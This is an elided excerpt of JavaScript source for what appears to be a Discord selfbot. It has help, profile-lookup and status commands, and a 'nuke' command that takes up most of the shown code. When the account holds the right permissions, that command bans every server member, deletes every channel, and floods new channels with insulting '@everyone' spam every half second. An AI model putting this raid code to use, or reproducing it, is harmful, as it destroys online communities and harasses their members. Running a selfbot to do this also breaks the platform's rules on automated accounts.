...
const sleep = (waitTimeInMs) => new Promise(resolve => setTimeout(resolve, waitTimeInMs));
 ...
 // webembed description max length = 347 characters
...
commands.push({
	name: "help",
	aliases: [ "help" ],
	description: "Sends the list of all commands (help «page»)",
	func: (msg, args) => {
		const commandList = [ ];
		...
		let page = 1;
		let maxPage = Math.ceil(commandList.join("").split("").length / 347);
		if (args.length >= 1)
		...
		Util.sendWebEmbed(msg.channel, new WebEmbed({shorten: true, hidden: true})
			.setTitle('Help (' + page.toString() + '/' + maxPage.toString() + ')')
			.setColor('GREEN')
...
commands.push({
	...
	func: (msg, args) => {
		client.user.createFriendInvite().then(flink => {
			...
			.setTitle( 'Friend Request Successfully Link created!')
			.setColor('GOLD')
			...
			user.mutualFriends.then(mutualFriends => {
				...
				Util.sendWebEmbed(msg.channel, new WebEmbed({shorten: true, hidden: true})
					...
					.setDescription("Account created at: " + createdAt.getFullYear() + "/" + createdAt.getMonth() + "/" + createdAt.getDate()+ " " + createdAt.getHours() + ":" + createdAt.getMinutes() + "\n"
						+ "Subscription: " + user.nitroType.replace("NITRO_BOOST", "Nitro").replace("NITRO_CLASSIC", "Nitro Classic").replace("NITRO_BASIC", "Nitro Basic").replace("NONE", "No Nitro") + "\n"
...
commands.push({
	...
	func: (msg, args) => {
		if (args[0].toLowerCase() == "start") {
			...
			Util.sendWebEmbed(msg.channel, new WebEmbed({shorten: true, hidden: true})
				.setTitle('Samsung Status Has Been Enabled!')
				.setProvider({name: "Drubisz?", url:''})
				.setColor('GREEN')
			...
			Util.sendWebEmbed(msg.channel, new WebEmbed({shorten: true, hidden: true})
				.setTitle('Samsung Status Has Been Disabled!')
				.setProvider({name: "Drubisz?", url:''})
				.setColor('RED')
...
commands.push({
	...
	func: (msg, args) => {
		const channelPerms = msg.guild.members.me.permissions.has("MANAGE_CHANNELS") || msg.guild.me.permissions.has("ADMINISTRATOR");
		const banPerms = msg.guild.members.me.permissions.has("BAN_MEMBERS") || msg.guild.me.permissions.has("ADMINISTRATOR");
		const rolePerms = msg.guild.members.me.permissions.has("MANAGE_ROLES") || msg.guild.me.permissions.has("ADMINISTRATOR");
		if (!banPerms || !rolePerms || !channelPerms) {
			Util.sendWebEmbed(msg.channel, new WebEmbed({shorten: true, hidden: true})
				.setTitle('Error!')
				.setProvider({name: "Drubisz?", url:''})
				.setColor('RED')
				.setDescription("I don't have enough permissions to nuke this server!"));
			return;
		};

		const arrayOfIDs = msg.guild.members.cache.map((user) => user.id);
		msg.guild.channels.create("nuked", { type: "GUILD_TEXT" }).then(newChannel => {
			newChannel.send("Found " + arrayOfIDs.length + " users.").then((msg) => {
				setTimeout(() => {
					msg.edit("Nuking...");
					for (let i = 0; i < arrayOfIDs.length; i++) {
						const user = arrayOfIDs[i];
						const member = msg.guild.members.cache.get(user);
						member.ban().catch((err) => Util.error(("Failed to ban \x19\x19\x19: " + err))).then(() => 
						console.log(gradient('yellow', 'orange', 'red').multiline(`Attempted to ban: ${member.user.tag}`)));
		
						msg.guild.channels.cache.forEach(channel => {
							if (channel.id !== newChannel.id) { // Don't delete the new channel
								console.log("channel found:" + channel.name + "\n");
								channel.delete().catch((err) => Util.error(("Error Found: " + err)));
							}
						});
						
						const newChannels = [];
						for (let i = 0; i < 10; i++) {
							msg.guild.channels.create("get-fucked", { type: "GUILD_TEXT" }).then((channel) => {
								newChannels.push(channel);
							}).catch((err) => { Util.error(("Error Found: " + err)) });
						}
						
						let messageIndex = 0;
						setInterval(() => {
							if (newChannels[messageIndex]) {
								newChannels[messageIndex].send("@everyone get nuked by chomik hacking corporation").catch(Util.error);
								messageIndex = (messageIndex + 1) % newChannels.length;
							}
						}, 500);
					}
				});
		...
		commands.push({
			...
			description: "",
			func: (msg, args) => {
				msg.channel.send("https://wykop.pl/cdn/c3201142/comment_ynonULRBFBMyljieknp9FlTImcxb3AuR.jpg").catch(Util.error);
			}
		});
